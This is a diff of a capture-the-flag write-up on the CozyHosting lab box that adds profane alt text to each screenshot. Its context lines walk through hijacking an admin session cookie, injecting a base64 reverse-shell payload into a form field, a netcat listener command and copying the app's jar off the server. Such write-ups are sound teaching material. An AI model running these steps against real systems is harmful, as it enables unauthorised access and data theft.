@@ -46,7 +46,7 @@ Nmap done: 1 IP address (1 host up) scanned in 95.89 seconds
 
 We see only `ssh` which usually dont have any exploit right off the bat and the webserver on port 80. So let's add the IP to our `/etc/hosts` file and check the website :
 
-<img src="/assets/img/CozyHostingWriteup/cozy-1.png" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/CozyHostingWriteup/cozy-1.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 We can directly see a `login` page, but let's do an enumeration on all the folders :
 
@@ -95,15 +95,15 @@ Task Completed
 
 Okay now we can see that there are a lot of `/actuator/` folder and one in particular is `/actuator/sessions` which looks like this :
 
-<img src="/assets/img/CozyHostingWriteup/cozy-2.png" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/CozyHostingWriteup/cozy-2.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 This looks like session cookie, which mean that  we can try to access the `/admin` webpage using those cookies. Let's try to do that by launching burpsuite with intercept on:
 
-<img src="/assets/img/CozyHostingWriteup/cozy-3.png" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/CozyHostingWriteup/cozy-3.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 We change the request by changing the `JSESSIONID` variable and...
 
-<img src="/assets/img/CozyHostingWriteup/cozy-4.png" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/CozyHostingWriteup/cozy-4.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 It works! We now have access to kanderson's admin webpage.
 
@@ -111,7 +111,7 @@ It works! We now have access to kanderson's admin webpage.
 
 Now we see that at the bottom of the webpage there is an option to include an host into automating patching. We can try to put a host into the `IP address field` and click submit, which greets us with this response :
 
-<img src="/assets/img/CozyHostingWriteup/cozy-5.png" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/CozyHostingWriteup/cozy-5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 We see that this respond the output of an ssh command. We can assume that this injects our input into a shell. Meaning that we can try and inject our own bit of code. Meaning we'll try and put in our reverse shell. We can assume that the command is :
 
@@ -147,13 +147,13 @@ So if instead of `[PAYLOAD]` we have `bWtub2QgL3RtcC9mIHAK` (`mknod /tmp/f p` in
 
 We now only need to wait for the reverse with `nc -lvnp 12345` on our terminal aaaand, we have a shell :
 
-<img src="/assets/img/CozyHostingWriteup/cozy-6.png" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/CozyHostingWriteup/cozy-6.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 ## Stealing jar file
 
 Once we have our shell, let's stabilize it using this [method](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal):
 
-<img src="/assets/img/CozyHostingWriteup/cozy-7.png" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/CozyHostingWriteup/cozy-7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 Okay so we see that there is a `cloudhosting-0.0.1.jar` file, let's steal that using our favorite python3 module `http.server` :
 
@@ -165,7 +165,7 @@ app@cozyhosting:/app$ Serving HTTP on 0.0.0.0 port 6868 (http://0.0.0.0:6868/) .
 
 let's visit the new webserver we've created and steal that jar file :
 
-<img src="/assets/img/CozyHostingWriteup/cozy-8.png" style="float: left; margin-right: 10px;" width="700"/>
+<img src="/assets/img/CozyHostingWriteup/cozy-8.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>
 
 Extract the archive and check what's inside. We find the file `cloudhosting-0.0.1/BOOT-INF/classes/application.properties` and it looks like this :
 
